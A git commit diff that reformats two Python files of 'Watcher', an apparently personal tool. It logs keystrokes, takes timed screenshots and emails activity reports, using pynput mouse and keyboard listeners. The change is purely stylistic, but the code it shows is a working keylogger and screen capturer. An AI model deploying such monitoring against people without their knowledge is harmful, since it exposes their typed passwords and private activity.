36a04ee58677c1c94452319da7738cfb8b6d6de3
proroad97 <prodromosm.97@gmail.com>
2024-10-25 21:59:34 +0300

    Added code formation

--- watcher/__init__.py
+++ watcher/__init__.py
@@ -1,54 +1,69 @@
 import argparse
 from sys import exit
-from pynput import mouse,keyboard
+from pynput import mouse, keyboard
 from watcher import controllers
-from watcher.events import KeyBoardEvent,MouseEvent
+from watcher.events import KeyBoardEvent, MouseEvent
 import watcher.tasks as tasks
 
+
 def watch():
-    parser=argparse.ArgumentParser(prog="Watcher",
-                                   description="Based on the provided arguments, it can watch the screen or the keyboard inputs and send email about the activeness of the computer ")
+    parser = argparse.ArgumentParser(
+        prog="Watcher",
+        description="Based on the provided arguments, it can watch the screen or the keyboard inputs and send email about the activeness of the computer ",
+    )
 
-    parser.add_argument('-cp','--config_path',help="The configure json file for setting email")
-    parser.add_argument('-k','--keyfile',help="File to log keyboard's inputs")
-    parser.add_argument('-sf','--screenshotfile',help="Directory to save screenshots")
-    parser.add_argument('-sc',"--screen_time",default=5,help="How often to take a screenshot")
-    parser.add_argument("--n_calls",default=100,help="The number of screenshots to be captured")
-    args=parser.parse_args()
+    parser.add_argument(
+        "-cp", "--config_path", help="The configure json file for setting email"
+    )
+    parser.add_argument("-k", "--keyfile", help="File to log keyboard's inputs")
+    parser.add_argument("-sf", "--screenshotfile", help="Directory to save screenshots")
+    parser.add_argument(
+        "-sc", "--screen_time", default=5, help="How often to take a screenshot"
+    )
+    parser.add_argument(
+        "--n_calls", default=100, help="The number of screenshots to be captured"
+    )
+    args = parser.parse_args()
 
-    keyboardcallbacks=[]
-    mousecallbacks=[]
-    
+    keyboardcallbacks = []
+    mousecallbacks = []
+
     if args.config_path:
-        Emailer=tasks.Emailer(config_path=args.config_path)
-        Emailer.apply_decorators([controllers.timer(restart_time=60,units="HOUR")])
+        Emailer = tasks.Emailer(config_path=args.config_path)
+        Emailer.apply_decorators([controllers.timer(restart_time=60, units="HOUR")])
         mousecallbacks.append(Emailer)
-    
+
     if args.screenshotfile:
-        Screenshoter=tasks.ScreenCapturer(save_dir=args.screenshotfile)
-        Screenshoter.apply_decorators([controllers.timer(restart_time=args.screen_time),controllers.calls(args.n_calls)])
+        Screenshoter = tasks.ScreenCapturer(save_dir=args.screenshotfile)
+        Screenshoter.apply_decorators(
+            [
+                controllers.timer(restart_time=args.screen_time),
+                controllers.calls(args.n_calls),
+            ]
+        )
         mousecallbacks.append(Screenshoter)
 
     if args.keyfile:
-        KeyCapturer=tasks.KeyBoardCapturer(path=args.keyfile)
+        KeyCapturer = tasks.KeyBoardCapturer(path=args.keyfile)
         keyboardcallbacks.append(KeyCapturer)
-    
 
-    if len(mousecallbacks)>0:
+    if len(mousecallbacks) > 0:
         print("mouse")
-        on_move=MouseEvent.on_move(mousecallbacks)
-        mouse_listener=mouse.Listener(on_move=on_move)
+        on_move = MouseEvent.on_move(mousecallbacks)
+        mouse_listener = mouse.Listener(on_move=on_move)
         mouse_listener.start()
 
-    if len(keyboardcallbacks)>0:
-        on_press=KeyBoardEvent.on_press(keyboardcallbacks)
-        key_listener=keyboard.Listener(on_press=on_press)
+    if len(keyboardcallbacks) > 0:
+        on_press = KeyBoardEvent.on_press(keyboardcallbacks)
+        key_listener = keyboard.Listener(on_press=on_press)
         key_listener.start()
-    
-    if len(keyboardcallbacks)==0 and len(mousecallbacks)==0:
+
+    if len(keyboardcallbacks) == 0 and len(mousecallbacks) == 0:
         print("Not have enough informations for storing the secrets")
         exit(1)
 
     print("Enter Z for Termination:")
-    while input()!="Z":continue
-    if KeyCapturer:KeyCapturer.save()
+    while input() != "Z":
+        continue
+    if KeyCapturer:
+        KeyCapturer.save()
--- watcher/events.py
+++ watcher/events.py
@@ -1,73 +1,87 @@
-from typing import Any, Callable,Iterable
+from typing import Any, Callable, Iterable
+
 
 class Callbacks:
     """
     Run an Iterable of callables and return their results as a list
 
     """
-    def __init__(self,callbacks:list[Callable]):
-        self.callbacks=callbacks if isinstance(callbacks,Iterable) else set(callbacks)            
 
-    def __call__(self, *args , **kwds ) :
-        results=[]
+    def __init__(self, callbacks: list[Callable]):
+        self.callbacks = (
+            callbacks if isinstance(callbacks, Iterable) else set(callbacks)
+        )
+
+    def __call__(self, *args, **kwds):
+        results = []
         for func in self.callbacks:
-            results.append(func(*args,**kwds))
+            results.append(func(*args, **kwds))
         return results
 
 
 class MouseEvent:
     """
-    A class that creates callbacks suitable for pynput Mouse Listener where     
+    A class that creates callbacks suitable for pynput Mouse Listener where
     the returned arguments ('x','dx',etc...) from pynput's controller are passed as keywords
     to the user's callbacks
 
     """
 
     @classmethod
-    def on_move(cls,callbacks:Iterable[Callable]):
-        callback=Callbacks(callbacks)
-        def _on_move(x,y):
-            keywords={"x":x,"y":y}
+    def on_move(cls, callbacks: Iterable[Callable]):
+        callback = Callbacks(callbacks)
+
+        def _on_move(x, y):
+            keywords = {"x": x, "y": y}
             callback(**keywords)
+
         return _on_move
 
     @classmethod
-    def on_scroll(cls,callbacks:Iterable[Callable]):
-        callback=Callbacks(callbacks)
-        def _on_scroll(x,y,dx,dy):
-            keywords={"x":x,"y":y,"dx":dx,"dy":dy}
+    def on_scroll(cls, callbacks: Iterable[Callable]):
+        callback = Callbacks(callbacks)
+
+        def _on_scroll(x, y, dx, dy):
+            keywords = {"x": x, "y": y, "dx": dx, "dy": dy}
             callback(**keywords)
+
         return _on_scroll
-        
+
     @classmethod
-    def on_click(cls,callbacks:Iterable[Callable]):
-        callback=Callbacks(callbacks)
+    def on_click(cls, callbacks: Iterable[Callable]):
+        callback = Callbacks(callbacks)
+
         def _on_click(x, y, button, pressed):
-            keywords={"x":x,"y":y,"button":button,"pressed":pressed}
+            keywords = {"x": x, "y": y, "button": button, "pressed": pressed}
             callback(**keywords)
+
         return _on_click
+
 
 class KeyBoardEvent:
     """
-    A class that creates callbacks suitable for pynput KeyBoard Listener where     
+    A class that creates callbacks suitable for pynput KeyBoard Listener where
     the returned arguments ('key')  from  pynput's controller are passed as keywords
     to the user's callbacks
 
     """
 
     @classmethod
-    def on_press(cls,callbacks:list[Callable]):
-        callback=Callbacks(callbacks)
+    def on_press(cls, callbacks: list[Callable]):
+        callback = Callbacks(callbacks)
+
         def _on_press(key):
-            keywords={"key":key}
+            keywords = {"key": key}
             callback(**keywords)
+
         return _on_press
-    
+
     @classmethod
-    def on_release(cls,callbacks:list[Callable]):
-        callback=Callbacks(callbacks)
+    def on_release(cls, callbacks: list[Callable]):
+        callback = Callbacks(callbacks)
+
         def _on_release(key):
-            keywords={"key":key}
+            keywords = {"key": key}
             callback(**keywords)
+
         return _on_release
-    
